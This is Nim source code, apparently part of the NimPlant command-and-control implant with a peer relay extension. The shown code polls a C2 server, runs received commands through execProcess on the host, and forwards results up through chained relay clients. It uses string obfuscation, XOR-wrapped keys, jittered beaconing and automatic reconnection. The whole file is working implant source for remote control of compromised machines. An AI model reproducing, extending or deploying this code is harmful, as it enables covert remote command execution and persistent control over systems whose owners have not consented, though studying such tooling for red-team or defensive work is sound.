                                    if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                                        echo "[DEBUG] 🌐 HTTP Handler: ⚠️  C2 connection error for relay client " & msg.fromID & " - sending empty response"
                                    else:
                                        echo "[DEBUG] 🌐 HTTP Handler: 📭 No commands for relay client " & msg.fromID & " - sending empty response"
                                
                                # Send empty response to complete the PULL cycle
                                let emptyResponse = createMessage(HTTP_RESPONSE,
                                    getRelayServerID(),
                                    msg.route,
                                    "NO_COMMANDS"
                                )
                                
                                let stats = relay_commands.getConnectionStats(g_relayServer)
                                if stats.connections > 0:
                                    discard broadcastMessage(g_relayServer, emptyResponse)
                                    when defined debug:
                                        echo "[DEBUG] 🌐 HTTP Handler: ✅ Empty response sent to relay client (PULL completed)"
                        
                        of RESPONSE:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Received command result from relay client"
                            
                            # Decrypt response from relay client
                            let decryptedResponse = decryptPayload(msg.payload, msg.fromID)
                            
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Relay response: " & 
                                     (if decryptedResponse.len > 100: decryptedResponse[0..99] & "..." else: decryptedResponse)
                            
                            # Parse response to extract cmdGuid, result, and encryption key
                            var actualResult: string
                            var responseCmdGuid: string
                            var relayClientKey: string
                            
                            try:
                                # Try to parse as JSON (new structured format with encryption key)
                                let responseData = parseJson(decryptedResponse)
                                responseCmdGuid = responseData["cmdGuid"].getStr()
                                actualResult = responseData["result"].getStr()
                                
                                # Extract and decrypt the relay client's encryption key
                                let encryptedKey = responseData["key"].getStr()
                                relayClientKey = xorString(encryptedKey, INITIAL_XOR_KEY)
                                
                                when defined debug:
                                    echo "[DEBUG] 📋 ┌─────────── PARSED RESPONSE DATA ───────────┐"
                                    echo "[DEBUG] 📋 │ cmdGuid: " & responseCmdGuid & " │"
                                    echo "[DEBUG] 📋 │ Result length: " & $actualResult.len & " bytes │"
                                    echo "[DEBUG] 🔑 │ Decrypted key length: " & $relayClientKey.len & " │"
                                    echo "[DEBUG] 📋 │ Result (first 100 chars): " & (if actualResult.len > 100: actualResult[0..99] & "..." else: actualResult) & " │"
                                    echo "[DEBUG] 📋 └─────────────────────────────────────────────┘"
                            except:
                                # Fallback to old format (plain result)
                                actualResult = decryptedResponse
                                responseCmdGuid = ""
                                relayClientKey = ""
                                
                                when defined debug:
                                    echo "[DEBUG] 📋 ┌─────────── FALLBACK TO OLD FORMAT ───────────┐"
                                    echo "[DEBUG] 📋 │ Using plain result format │"
                                    echo "[DEBUG] 📋 │ Result length: " & $actualResult.len & " bytes │"
                                    echo "[DEBUG] ⚠️  │ No encryption key available │"
                                    echo "[DEBUG] 📋 └─────────────────────────────────────────────┘"
                            
                            # Send result to C2 using exported function
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: Sending relay result to C2..."
                                echo "[DEBUG] 🌐 HTTP Handler: Using cmdGuid: " & responseCmdGuid & " for client: " & msg.fromID
                            
                            # SAFE KEY MANAGEMENT: Temporarily change listener ID and encryption key to relay client's values
                            let originalId = listener.id
                            var originalKey = listener.UNIQUE_XOR_KEY  # Default to current key
                            listener.id = msg.fromID
                            
                            # Use the relay client's encryption key if available
                            if relayClientKey != "":
                                originalKey = safeKeySwap(listener, relayClientKey)
                                when defined debug:
                                    echo "[DEBUG] 🔑 ✅ Safe key swap for C2 result submission"
                            else:
                                when defined debug:
                                    echo "[DEBUG] ⚠️  HTTP Handler: No encryption key from relay client, using relay server's key"
                            
                            # Send result to C2 with correct cmdGuid using exported function
                            webClientListener.postCommandResults(listener, responseCmdGuid, actualResult)
                            
                            # SAFE KEY RESTORATION: Restore original listener ID and encryption key
                            listener.id = originalId
                            safeKeyRestore(listener, originalKey)
                            
                            # SECURITY: Clear the relay client's encryption key from memory
                            clearSensitiveKey(relayClientKey)
                            
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: ✅ Relay result sent to C2"
                            
                            # Send confirmation back to relay client
                            let confirmMsg = createMessage(HTTP_RESPONSE,
                                getRelayServerID(),
                                msg.route,
                                "RESULT_SENT_TO_C2"
                            )
                            
                            let stats = relay_commands.getConnectionStats(g_relayServer)
                            if stats.connections > 0:
                                discard broadcastMessage(g_relayServer, confirmMsg)
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Confirmation sent to relay client"
                            else:
                                when defined debug:
                                    echo "[DEBUG] 🌐 HTTP Handler: ⚠️  No relay connections to send confirmation to"
                        
                        of COMMAND, FORWARD, HTTP_REQUEST, HTTP_RESPONSE:
                            when defined debug:
                                echo "[DEBUG] 🌐 HTTP Handler: ℹ️  Ignoring relay message type: " & $msg.msgType
                    
                except Exception as e:
                    when defined debug:
                        echo "[DEBUG] 🌐 HTTP Handler: Error polling relay server: " & e.msg
                        
                when defined debug:
                    echo ""
                    echo "┌─ 📡 END RELAY SERVER POLLING CYCLE"
                    let finalStats = relay_commands.getConnectionStats(g_relayServer)
                    echo "├─ Processed: " & $messageCount & " messages │ Active connections: " & $finalStats.connections
                    echo "└─────────────────────────────────────────────────────────"
                    echo ""
            
            # 2. Handle command results - send to C2
            for result in g_commandsToC2:
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: Sending result to C2 (first 100 chars): " & 
                         (if result.result.len > 100: result.result[0..99] & "..." else: result.result)
                
                webClientListener.postCommandResults(listener, result.guid, result.result)
                
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Result sent to C2"
            
            g_commandsToC2 = @[]  # Clear processed results
            
            # 3. CRITICAL: Poll C2 for commands (this does the check-in!)
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Polling C2 for commands (check-in)"
            
            let (cmdGuid, cmd, args) = webClientListener.getQueuedCommand(listener)
            
            when defined debug:
                if cmd != "":
                    echo "[DEBUG] 🌐 HTTP Handler: Got command from C2: " & cmd
            else:
                    echo "[DEBUG] 🌐 HTTP Handler: No commands from C2 (check-in successful)"
            
            if cmd != "":
                # Process ALL commands locally (this is a normal implant!)
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: Processing command locally: " & cmd
                
                let result = cmdParser.parseCmd(listener, cmd, cmdGuid, args)
                webClientListener.postCommandResults(listener, cmdGuid, result)
                
                when defined debug:
                    echo "[DEBUG] 🌐 HTTP Handler: ✅ Command executed and result sent to C2"
                    echo "[DEBUG] 🌐 HTTP Handler: Result (first 200 chars): " & 
                         (if result.len > 200: result[0..199] & "..." else: result)
            
            # 4. Sleep with jitter (like normal implant) - ADAPTIVE FOR RELAY SPEED
            let connectionStats = relay_commands.getConnectionStats(g_relayServer)
            let sleepMs = if g_relayServer.isListening and connectionStats.connections > 0:
                # ADAPTIVE timing when relay clients are connected - adjust based on network health
                let baseTime = if g_serverFastMode: 500 else: 1000
                let adaptiveTime = int(float(baseTime) * g_networkHealth.adaptiveMultiplier)
                # Apply safety bounds: min 200ms, max 15s
                min(max(adaptiveTime, 200), 15000)
            elif g_relayServer.isListening and g_serverFastMode:
                # FORCE fast timing when relay server has fast mode clients
                g_adaptiveMaxSleep  # 1000ms for fast clients, 2000ms for normal
            elif listener.sleepTime > 2:
                # Normal case for high sleep time configs
                g_adaptiveMaxSleep  # Use adaptive timing based on client mode
            else:
                # Low sleep time configs use original timing
                listener.sleepTime * 1000
            
            let jitterMs = if listener.sleepJitter > 0:
                int(float(sleepMs) * (listener.sleepJitter / 100.0) * rand(1.0))
            else:
                0
            
            let totalSleepMs = sleepMs + jitterMs
            
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Sleeping for " & $totalSleepMs & "ms (adaptive mode - fast: " & 
                     $g_serverFastMode & ", base: " & $sleepMs & "ms, jitter: " & $jitterMs & "ms)"
                echo "[DEBUG] 🌐 HTTP Handler: Timing decision analysis:"
                echo "[DEBUG] 🌐 HTTP Handler: - Relay server listening: " & $g_relayServer.isListening
                echo "[DEBUG] 🌐 HTTP Handler: - Connected relay clients: " & $connectionStats.connections
                echo "[DEBUG] 🌐 HTTP Handler: - Server fast mode: " & $g_serverFastMode
                echo "[DEBUG] 🌐 HTTP Handler: - Adaptive max sleep: " & $g_adaptiveMaxSleep & "ms"
                echo "[DEBUG] 🌐 HTTP Handler: - Original listener sleep time: " & $listener.sleepTime & "s"
                echo "[DEBUG] 🌐 Network Throttling Status:"
                echo "[DEBUG] 🌐 - Network RTT: " & $g_networkHealth.rtt.int & "ms"
                echo "[DEBUG] 🌐 - Is slow network: " & $g_networkHealth.isSlowNetwork
                echo "[DEBUG] 🌐 - Adaptive multiplier: " & $g_networkHealth.adaptiveMultiplier
                echo "[DEBUG] 🌐 - Consecutive errors: " & $g_networkHealth.consecutiveErrors
                if g_networkHealth.consecutiveErrors > 0:
                    echo "[DEBUG] 🚨 - Network experiencing issues, using backoff timing"
            
            await sleepAsync(totalSleepMs)
            
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler: Woke up from sleep, continuing loop"
                echo ""
                echo "┌─ 🌐 END HTTP HANDLER CYCLE"
                echo "├─ 💤 Slept for " & $totalSleepMs & "ms - continuing loop"
                echo "└─────────────────────────────────────────────────────────"
                echo ""
                echo ""
                echo ""
        except Exception as e:
            when defined debug:
                echo "[DEBUG] 🌐 HTTP Handler error: " & e.msg
                echo "[DEBUG] 🌐 HTTP Handler: Exception details: " & e.getStackTrace()
            await sleepAsync(ERROR_RECOVERY_SLEEP) # Optimized error recovery sleep

# Async relay client handler
proc relayClientHandler(host: string, port: int) {.async.} =
    when defined debug:
        echo "[DEBUG] 🔗 Starting async relay client handler"
        echo "[DEBUG] 🔗 Relay Client Handler: Host=" & host & ", Port=" & $port
        echo "[DEBUG] 🔗 Relay Client Handler: upstreamRelay.isConnected=" & $upstreamRelay.isConnected
    
    var loopCount = 0
    while true:
        try:
            loopCount += 1
            
            when defined debug:
                echo ""
                echo "┌─ 🔗 RELAY CLIENT CYCLE #" & $loopCount
                echo "├─ Host: " & host & ":" & $port & " │ Connected: " & $upstreamRelay.isConnected & " │ ID: " & g_relayClientID
                echo "└─────────────────────────────────────────────────────────"
                echo ""
                echo "[DEBUG] 🔗 Relay Client: Polling upstream relay for messages..."
                echo "[DEBUG] 🔗 Relay Client: Connection status: " & $upstreamRelay.isConnected
            
            # SOCKET HEALTH DIAGNOSTICS: Check if client socket is still valid
            when defined debug:
                try:
                    let clientFd = upstreamRelay.socket.getFd()
                    if clientFd == osInvalidSocket:
                        echo "[DEBUG] 🚨 ┌─────────── SOCKET CORRUPTION DETECTED ───────────┐"
                        echo "[DEBUG] 🚨 │ Client socket FD is INVALID! │"
                        echo "[DEBUG] 🚨 │ This explains why send/recv fail │"
                        echo "[DEBUG] 🚨 │ Socket was corrupted gradually │"
                        echo "[DEBUG] 🚨 └─────────────────────────────────────────────────┘"
                        upstreamRelay.isConnected = false
                        await sleepAsync(ERROR_RECOVERY_SLEEP)
                        continue
                    else:
                        echo "[DEBUG] 🔍 Socket health check - FD: " & $int(clientFd) & " (valid)"
                except Exception as fdError:
                    echo "[DEBUG] 🚨 ┌─────────── SOCKET FD ERROR ───────────┐"
                    echo "[DEBUG] 🚨 │ Cannot check socket FD: " & fdError.msg & " │"
                    echo "[DEBUG] 🚨 │ Socket is definitely corrupted │"
                    echo "[DEBUG] 🚨 └─────────────────────────────────────────┘"
                    upstreamRelay.isConnected = false
                    await sleepAsync(ERROR_RECOVERY_SLEEP)
                    continue
            
            let messages = pollUpstreamRelayMessages()  # Uses safe polling with timeout
            
            # UPDATE SUCCESS TIME: If we received messages, update last success time
            if messages.len > 0:
                g_networkHealth.lastSuccessTime = epochTime().int64
                g_networkHealth.consecutiveErrors = 0  # Reset errors when we get responses
            
            when defined debug:
                if messages.len > 0:
                    echo "[DEBUG] 🔗 ═══════════════════════════════════════════════════════════════"
                    echo "[DEBUG] 🔗 RELAY CLIENT: Received " & $messages.len & " messages from relay server"
                    echo "[DEBUG] 🔗 ═══════════════════════════════════════════════════════════════"
                else:
                    echo "[DEBUG] 🔗 Relay Client: No messages from relay server (polling...)"
            
            for msg in messages:
                when defined debug:
                    echo "[DEBUG] 📨 ┌─────────── RELAY CLIENT MESSAGE ───────────┐"
                    echo "[DEBUG] 📨 │ Type: " & $msg.msgType & " │"
                    echo "[DEBUG] 📨 │ From: " & msg.fromID & " │"
                    echo "[DEBUG] 📨 │ Route: " & $msg.route & " │"
                    echo "[DEBUG] 📨 │ Payload: " & $msg.payload.len & " bytes │"
                    echo "[DEBUG] 📨 └─────────────────────────────────────────────┘"
                
                case msg.msgType:
                of COMMAND:
                    # Execute command and send result back via relay
                    let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
                    
                    when defined debug:
                        echo "[DEBUG] 🎯 ┌─────────── COMMAND FROM C2 VIA RELAY ───────────┐"
                        echo "[DEBUG] 🎯 │ ✅ COMMAND RECEIVED FROM C2 (via relay server) │"
                        echo "[DEBUG] 🎯 │ Command from ID: " & msg.fromID & " │"
                        echo "[DEBUG] 🎯 │ Route: " & $msg.route & " │"
                        echo "[DEBUG] 🎯 │ Encrypted payload: " & $msg.payload.len & " bytes │"
                        echo "[DEBUG] 🎯 └─────────────────────────────────────────────────┘"
                    
                    when defined debug:
                        echo "[DEBUG] 🔓 ┌─────────── DECRYPTED PAYLOAD ───────────┐"
                        echo "[DEBUG] 🔓 │ Payload: " & decryptedPayload & " │"
                        echo "[DEBUG] 🔓 └─────────────────────────────────────────┘"
                    
                    # Parse JSON payload to extract command and cmdGuid
                    var actualCommand: string
                    var cmdGuid: string
                    var args: seq[string] = @[]
                    
                    try:
                        # Try to parse as JSON (new format)
                        let commandData = parseJson(decryptedPayload)
                        cmdGuid = commandData["cmdGuid"].getStr()
                        actualCommand = commandData["command"].getStr()
                        if commandData.hasKey("args"):
                            for arg in commandData["args"]:
                                args.add(arg.getStr())
                        
                        when defined debug:
                            echo "[DEBUG] 📋 ┌─────────── PARSED COMMAND DATA ───────────┐"
                            echo "[DEBUG] 📋 │ cmdGuid: " & cmdGuid & " │"
                            echo "[DEBUG] 📋 │ Command: " & actualCommand & " │"
                            echo "[DEBUG] 📋 │ Args: " & $args & " │"
                            echo "[DEBUG] 📋 └─────────────────────────────────────────────┘"
                    except:
                        # Fallback to old format (plain command)
                        actualCommand = decryptedPayload
                        cmdGuid = ""
                        
                        when defined debug:
                            echo "[DEBUG] 📋 ┌─────────── FALLBACK TO OLD FORMAT ───────────┐"
                            echo "[DEBUG] 📋 │ Using plain command format │"
                            echo "[DEBUG] 📋 │ Command: " & actualCommand & " │"
                            echo "[DEBUG] 📋 └─────────────────────────────────────────────┘"
                    
                    when defined debug:
                        echo "[DEBUG] ⚡ Executing command: " & actualCommand
                        if args.len > 0:
                            echo "[DEBUG] ⚡ Command arguments: " & $args
                    
                    # For relay clients, we need to handle commands differently
                    # since we don't have an HTTP listener
                    var result: string
                    if actualCommand.startsWith("relay "):
                        # RELAY COMMANDS: Process using relay command handler
                        # Relay commands handle their own argument parsing
                        result = processRelayCommand(actualCommand)
                        when defined debug:
                            echo "[DEBUG] 🔧 Relay command executed"
                    else:
                        # SYSTEM COMMANDS: Combine command with arguments before execution
                        var fullCommand = actualCommand
                        
                        # ✅ FIX: Properly combine command with arguments
                        if args.len > 0:
                            for arg in args:
                                fullCommand = fullCommand & " " & arg
                        
                        when defined debug:
                            echo "[DEBUG] 💻 ┌─────────── COMMAND EXECUTION ───────────┐"
                            echo "[DEBUG] 💻 │ Base command: '" & actualCommand & "' │"
                            echo "[DEBUG] 💻 │ Arguments: " & $args & " │"
                            echo "[DEBUG] 💻 │ Full command: '" & fullCommand & "' │"
                            echo "[DEBUG] 💻 └─────────────────────────────────────────┘"
                        
                        # Execute the complete command with arguments
                        try:
                            result = execProcess(fullCommand)
                            when defined debug:
                                echo "[DEBUG] 💻 ┌─────────── COMMAND RESULT ───────────┐"
                                echo "[DEBUG] 💻 │ ✅ System command executed successfully │"
                                echo "[DEBUG] 💻 │ Full command: '" & fullCommand & "' │"
                                echo "[DEBUG] 💻 │ Result length: " & $result.len & " bytes │"
                                echo "[DEBUG] 💻 │ Result (first 200 chars): │"
                                echo "[DEBUG] 💻 │ " & (if result.len > 200: result[0..199] & "..." else: result) & " │"
                                echo "[DEBUG] 💻 └─────────────────────────────────────┘"
                        except Exception as e:
                            result = "Error executing command '" & fullCommand & "': " & e.msg
                            when defined debug:
                                echo "[DEBUG] ❌ ┌─────────── COMMAND ERROR ───────────┐"
                                echo "[DEBUG] ❌ │ Command execution failed │"
                                echo "[DEBUG] ❌ │ Full command: '" & fullCommand & "' │"
                                echo "[DEBUG] ❌ │ Error: " & e.msg & " │"
                                echo "[DEBUG] ❌ └─────────────────────────────────────┘"
                    
                    when defined debug:
                        echo "[DEBUG] 📤 ┌─────────── SENDING RESULT TO RELAY ───────────┐"
                        echo "[DEBUG] 📤 │ Sending result back to relay server... │"
                        echo "[DEBUG] 📤 │ From ID: " & g_relayClientID & " │"
                        echo "[DEBUG] 📤 │ Route: " & $msg.route & " │"
                        echo "[DEBUG] 📤 │ cmdGuid: " & cmdGuid & " │"
                        echo "[DEBUG] 📤 │ Result size: " & $result.len & " bytes │"
                        echo "[DEBUG] 📤 └─────────────────────────────────────────────┘"
                    
                    # Create structured response with cmdGuid and result
                    let responsePayload = %*{
                        "cmdGuid": cmdGuid,
                        "result": result,
                        "clientId": g_relayClientID,
                        "key": xorString(g_relayClientKey, INITIAL_XOR_KEY)  # Include encrypted key
                    }
                    
                    let resultMsg = createMessage(RESPONSE,
                        g_relayClientID,
                        msg.route,
                        $responsePayload
                    )
                    
                    if sendMessage(upstreamRelay, resultMsg):
                        when defined debug:
                            echo "[DEBUG] ✅ ┌─────────── RESULT SENT ───────────┐"
                            echo "[DEBUG] ✅ │ Result sent back to relay server │"
                            echo "[DEBUG] ✅ │ Waiting for C2 confirmation... │"
                            echo "[DEBUG] ✅ └─────────────────────────────────┘"
                    else:
                        when defined debug:
                            echo "[DEBUG] ❌ ┌─────────── SEND FAILED ───────────┐"
                            echo "[DEBUG] ❌ │ Failed to send result to relay │"
                            echo "[DEBUG] ❌ └─────────────────────────────────┘"
                
                of HTTP_RESPONSE:
                    # This could be ID assignment or command result confirmation
                    let responsePayload = decryptPayload(msg.payload, msg.fromID)
                    
                    when defined debug:
                        echo "[DEBUG] 🔄 ┌─────────── HTTP RESPONSE FROM RELAY ───────────┐"
                        echo "[DEBUG] 🔄 │ ✅ HTTP RESPONSE FROM RELAY SERVER │"
                        echo "[DEBUG] 🔄 │ Response: " & responsePayload & " │"
                        echo "[DEBUG] 🔄 └─────────────────────────────────────────────────┘"
                    
                    if responsePayload == "RESULT_SENT_TO_C2":
                        when defined debug:
                            echo "[DEBUG] 🎉 ┌─────────── C2 CONFIRMATION ───────────┐"
                            echo "[DEBUG] 🎉 │ ✅ Command result successfully sent to C2 │"
                            echo "[DEBUG] 🎉 │ End-to-end command flow completed! │"
                            echo "[DEBUG] 🎉 └─────────────────────────────────────────┘"
                    elif responsePayload == "NO_COMMANDS":
                        # This is a normal "no commands" response - don't treat as ID assignment
                        when defined debug:
                            echo "[DEBUG] 💤 ┌─────────── NO COMMANDS RESPONSE ───────────┐"
                            echo "[DEBUG] 💤 │ ✅ No commands available from relay server │"
                            echo "[DEBUG] 💤 │ PULL cycle completed successfully │"
                            echo "[DEBUG] 💤 └─────────────────────────────────────────────┘"
                    elif responsePayload != "" and responsePayload != "PENDING-REGISTRATION" and not responsePayload.startsWith("RESULT_"):
                        # This could be an ID assignment (new JSON format) or old simple ID
                        try:
                            # Try to parse as JSON 
                            let regResponse = parseJson(responsePayload)
                            let assignedId = regResponse["id"].getStr()
                            
                            # Check if this is a new registration or re-registration
                            if regResponse.hasKey("key"):
                                # NEW REGISTRATION: Has encryption key
                                let encryptionKey = regResponse["key"].getStr()
                                g_relayClientID = assignedId
                                g_relayClientKey = encryptionKey
                                storeImplantID(assignedId)
                                
                                when defined debug:
                                    echo "[DEBUG] 🆔 ┌─────────── NEW ID & KEY ASSIGNMENT ───────────┐"
                                    echo "[DEBUG] 🆔 │ ✅ NEW ID and encryption key assigned by C2 │"
                                    echo "[DEBUG] 🆔 │ New ID: " & assignedId & " │"
                                    echo "[DEBUG] 🔑 │ Key length: " & $encryptionKey.len & " │"
                                    echo "[DEBUG] 🆔 └─────────────────────────────────────────────────┘"
                            elif regResponse.hasKey("status") and regResponse["status"].getStr() == "reconnected":
                                # RE-REGISTRATION: Confirmed existing ID, keep current encryption key
                                g_relayClientID = assignedId
                                # g_relayClientKey stays the same - don't change it!
                                # ID should already be stored, but confirm it
                                storeImplantID(assignedId)
                                
                                when defined debug:
                                    echo "[DEBUG] 🔄 ┌─────────── RE-REGISTRATION CONFIRMED ───────────┐"
                                    echo "[DEBUG] 🔄 │ ✅ Existing ID confirmed by relay server │"
                                    echo "[DEBUG] 🔄 │ ID: " & assignedId & " (PRESERVED) │"
                                    echo "[DEBUG] 🔑 │ Encryption key: PRESERVED (no change) │"
                                    echo "[DEBUG] 🔄 │ 🎉 Successfully reconnected with existing ID! │"
                                    echo "[DEBUG] 🔄 └─────────────────────────────────────────────────┘"
                            else:
                                # Unknown format
                                when defined debug:
                                    echo "[DEBUG] ⚠️  Unknown registration response format"
                        except:
                            # Fallback to old format (plain ID)
                            g_relayClientID = responsePayload
                            storeImplantID(responsePayload)
                            when defined debug:
                                echo "[DEBUG] 🆔 ┌─────────── ID ASSIGNMENT (OLD FORMAT) ───────────┐"
                                echo "[DEBUG] 🆔 │ ✅ ID assigned by C2 and stored │"
                                echo "[DEBUG] 🆔 │ New ID: " & responsePayload & " │"
                                echo "[DEBUG] ⚠️  │ No encryption key received (old format) │"
                                echo "[DEBUG] 🆔 └─────────────────────────────────────────────────┘"
                    else:
                        when defined debug:
                            echo "[DEBUG] ℹ️  ┌─────────── OTHER RESPONSE ───────────┐"
                            echo "[DEBUG] ℹ️  │ Other HTTP response: " & responsePayload & " │"
                            echo "[DEBUG] ℹ️  └─────────────────────────────────────────┘"
                
                of FORWARD:
                    # Forwarded message from another implant
                    when defined debug:
                        echo "[DEBUG] 🔗 Relay Client: Received forwarded message"
                
                else:
                    when defined debug:
                        echo "[DEBUG] 🔗 Relay Client: ℹ️  Ignoring message type: " & $msg.msgType
            
            # DEAD CONNECTION DETECTION: Check if we haven't received any response to our PULL requests
            let timeSinceLastMessage = epochTime().int64 - g_networkHealth.lastSuccessTime
            if messages.len == 0 and timeSinceLastMessage > 30:  # No messages for 30+ seconds
                when defined debug:
                    echo "[DEBUG] 🚨 ┌─────────── DEAD CONNECTION DETECTED ───────────┐"
                    echo "[DEBUG] 🚨 │ No responses for " & $timeSinceLastMessage & " seconds │"
                    echo "[DEBUG] 🚨 │ Assuming connection is dead │"
                    echo "[DEBUG] 🚨 └─────────────────────────────────────────────────┘"
                
                # Force disconnect and reconnect
                upstreamRelay.isConnected = false
                # Skip sending PULL this cycle, will reconnect in next iteration
                await sleepAsync(ERROR_RECOVERY_SLEEP)
                continue
            
            # Send PULL message to request commands from relay server
            when defined debug:
                echo "[DEBUG] 📡 ┌─────────── SENDING PULL REQUEST ───────────┐"
                echo "[DEBUG] 📡 │ Sending PULL request for commands... │"
                echo "[DEBUG] 📡 │ Client ID: " & g_relayClientID & " │"
                echo "[DEBUG] 📡 │ Route: [" & g_relayClientID & ", RELAY-SERVER] │"
                echo "[DEBUG] 🔑 │ Encrypting key with INITIAL_XOR_KEY │"
                echo "[DEBUG] 🌐 │ Network RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & " │"
                echo "[DEBUG] 📡 └─────────────────────────────────────────────┘"
            
            # Record start time for network latency measurement
            let pullStartTime = epochTime()
            
            # SOCKET HEALTH BEFORE SEND: Critical diagnostic point
            when defined debug:
                try:
                    let preSendFd = upstreamRelay.socket.getFd()
                    if preSendFd == osInvalidSocket:
                        echo "[DEBUG] 🚨 ┌─────────── PRE-SEND SOCKET CORRUPTION ───────────┐"
                        echo "[DEBUG] 🚨 │ Socket FD corrupted BEFORE sending PULL │"
                        echo "[DEBUG] 🚨 │ This will definitely cause send to fail │"
                        echo "[DEBUG] 🚨 └─────────────────────────────────────────────────┘"
                        upstreamRelay.isConnected = false
                        await sleepAsync(ERROR_RECOVERY_SLEEP)
                        continue
                    else:
                        echo "[DEBUG] 🔍 Pre-send socket health - FD: " & $int(preSendFd) & " (sending PULL now...)"
                except Exception as preSendError:
                    echo "[DEBUG] 🚨 Pre-send socket check failed: " & preSendError.msg
                    upstreamRelay.isConnected = false
                    await sleepAsync(ERROR_RECOVERY_SLEEP)
                    continue
            
            # Encrypt the relay client's encryption key for secure transmission
            let encryptedKey = xorString(g_relayClientKey, INITIAL_XOR_KEY)
            
            # Create pull payload with encrypted encryption key
            let pullPayload = %*{
                "action": "poll_commands",
                "key": encryptedKey
            }
            
            let pullMsg = createMessage(PULL,
                g_relayClientID,
                @[g_relayClientID, "RELAY-SERVER"],
                $pullPayload
            )
            
            let pullSuccess = sendMessage(upstreamRelay, pullMsg)
            
            # CRITICAL: Track if we're receiving responses to detect dead connections
            if pullSuccess:
                # Update network health based on PULL success/failure
                updateNetworkHealth(pullStartTime, pullSuccess)
                
                when defined debug:
                    echo "[DEBUG] ✅ ┌─────────── PULL SENT ───────────┐"
                    echo "[DEBUG] ✅ │ PULL request sent successfully │"
                    echo "[DEBUG] ✅ │ Waiting for relay server... │"
                    echo "[DEBUG] ✅ └─────────────────────────────────┘"
                
            else:
                # Send failed - connection is definitely dead
                updateNetworkHealth(pullStartTime, false)
                
                # POST-SEND SOCKET DIAGNOSTICS: Check what happened to socket after send failed
                when defined debug:
                    echo "[DEBUG] ❌ ┌─────────── PULL FAILED ───────────┐"
                    echo "[DEBUG] ❌ │ Failed to send PULL request │"
                    
                    try:
                        let postSendFd = upstreamRelay.socket.getFd()
                        if postSendFd == osInvalidSocket:
                            echo "[DEBUG] ❌ │ Socket FD corrupted DURING send! │"
                            echo "[DEBUG] ❌ │ Send operation corrupted the socket │"
                        else:
                            echo "[DEBUG] ❌ │ Socket FD still valid: " & $int(postSendFd) & " │"
                            echo "[DEBUG] ❌ │ Send failed for other reason │"
                    except Exception as postSendError:
                        echo "[DEBUG] ❌ │ Cannot check post-send FD: " & postSendError.msg & " │"
                    
                    echo "[DEBUG] ❌ │ Connection marked as dead │"
                    echo "[DEBUG] ❌ └─────────────────────────────────┘"
                
                # Force disconnect
                upstreamRelay.isConnected = false
            
            # Use adaptive polling interval based on network conditions
            let adaptiveInterval = getAdaptivePollingInterval()
            
            when defined debug:
                echo ""
                echo "[DEBUG] 🌐 Adaptive sleep: " & $adaptiveInterval & "ms (base: " & 
                     (if CLIENT_FAST_MODE: "1000ms" else: "2000ms") & ", RTT: " & $g_networkHealth.rtt.int & "ms)"
                echo ""
                echo "┌─ 🔗 END RELAY CLIENT CYCLE #" & $loopCount
                echo "├─ 💤 Sleeping for " & $adaptiveInterval & "ms..."
                echo "└─────────────────────────────────────────────────────────"
                echo ""
                echo ""
                echo ""
            
            await sleepAsync(adaptiveInterval)
            
            # SAFE RECONNECTION: Check if connection is still alive and handle stuck connections
            if not upstreamRelay.isConnected:
                # Check if we can attempt reconnection (backoff protection)
                if canAttemptReconnection():
                    recordReconnectionAttempt()
                    let reconnectDelay = getReconnectionDelay()
                    
                    when defined debug:
                        echo "[DEBUG] 🔄 Connection lost, attempting safe reconnection..."
                        echo "[DEBUG] 🔄 Backoff delay: " & $reconnectDelay & "ms"
                    
                    await sleepAsync(reconnectDelay)
                    let reconnectResult = connectToUpstreamRelay(host, port)
                    
                    when defined debug:
                        echo "[DEBUG] 🔄 Reconnection result: " & reconnectResult
                    
                    # Reset manager if successful
                    if upstreamRelay.isConnected:
                        resetReconnectionManager()
                        when defined debug:
                            echo "[DEBUG] ✅ Reconnection successful, backoff reset"
                else:
                    when defined debug:
                        echo "[DEBUG] 🚨 Reconnection attempts exceeded, entering long cooldown"
                    await sleepAsync(60000)  # 1 minute cooldown when max attempts reached
            
        except Exception as e:
            when defined debug:
                echo "[DEBUG] Relay client error: " & e.msg
            await sleepAsync(ERROR_RECOVERY_SLEEP) # Optimized error recovery sleep

# Safe async wrappers to prevent event loop crashes - FIXED ASYNC RECURSION CASCADE
var g_relayClientRunning = false
var g_httpHandlerRunning = false

proc safeRelayClientHandler(host: string, port: int) {.async.} =
    if g_relayClientRunning:
        when defined debug:
            echo "[SAFETY] 🛡️  Relay client already running, ignoring duplicate start"
        return
    
    g_relayClientRunning = true
    try:
        await relayClientHandler(host, port)
    except Exception as e:
        when defined debug:
            echo "[CRITICAL] 🚨 Relay client handler crashed: " & e.msg
            echo "[CRITICAL] 🚨 Stack trace: " & e.getStackTrace()
        # Attempt recovery after delay - NO RECURSION
        await sleepAsync(5000)  # 5 second recovery delay
        when defined debug:
            echo "[RECOVERY] 🔄 Relay client will restart in main loop - NO RECURSION"
    finally:
        g_relayClientRunning = false
        when defined debug:
            echo "[CLEANUP] 🧹 Relay client handler stopped, flag reset"

proc safeHttpHandler() {.async.} =
    if g_httpHandlerRunning:
        when defined debug:
            echo "[SAFETY] 🛡️  HTTP handler already running, ignoring duplicate start"
        return
    
    g_httpHandlerRunning = true
    try:
        await httpHandler()
    except Exception as e:
        when defined debug:
            echo "[CRITICAL] 🚨 HTTP handler crashed: " & e.msg
            echo "[CRITICAL] 🚨 Stack trace: " & e.getStackTrace()
        # Attempt recovery after delay - NO RECURSION
        await sleepAsync(5000)  # 5 second recovery delay
        when defined debug:
            echo "[RECOVERY] 🔄 HTTP handler will restart in main loop - NO RECURSION"
    finally:
        g_httpHandlerRunning = false
        when defined debug:
            echo "[CLEANUP] 🧹 HTTP handler stopped, flag reset"

# Main execution function
